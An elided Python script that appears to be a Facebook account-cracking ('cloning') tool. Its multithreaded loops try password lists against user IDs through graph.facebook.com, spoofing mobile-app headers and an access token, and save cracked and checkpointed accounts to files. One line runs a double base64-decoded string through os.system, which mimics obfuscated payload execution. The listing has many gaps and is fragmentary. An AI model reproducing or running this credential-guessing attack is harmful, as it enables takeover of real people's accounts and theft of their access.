...
try:
    ...
    os.system(base64.b64decode(base64.b64decode("https://t.me/JokerB28")))
...
⠄⠄⠄⠄⠄⠄⣀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣄⣀⡀⠄⠄⠄⠄⠄
   ...
   ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⠙⠝⠂⠄⢘⠋⠃⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄ 
════════════════════════════════════════════════
\033[1;32m  • \033[1;37m Tool Owner :- Khalil Ibn Suleiman 
\033[1;32m  • \033[1;37m GitHub     :-  Luffy
...
def method():
    ...
    with tred(max_workers=30) as Luffy:
        ...
        for user in fo:
            ...
            passlist = plist
            if methd =='1':
                Luffy.submit(api1,ids,names,passlist)
            #elif methd =='2':
               ...
               # if (c).lower() == "y":user_opt.append("c")
                ...
                with tred(max_workers=30) as Luffy:     
                        ...
                        for psx in user:
                                ...
                                Luffy.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/Luffy/Luffy-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Khalil.py')
...
def gmail():
                ...
                with tred(max_workers=30) as Luffy:
                        ...
                        for user in fo:
                                ...
                                Luffy.submit(rd1,ids,passlist)
                print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/Luffy/Luffy-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/Luffy/Luffy-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python Khalil.py')
...
def rd1(ids,passlist):
    try:
        ...
        for pas in passlist:
                ...
                head = {'User-Agent':Luffy_UA(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
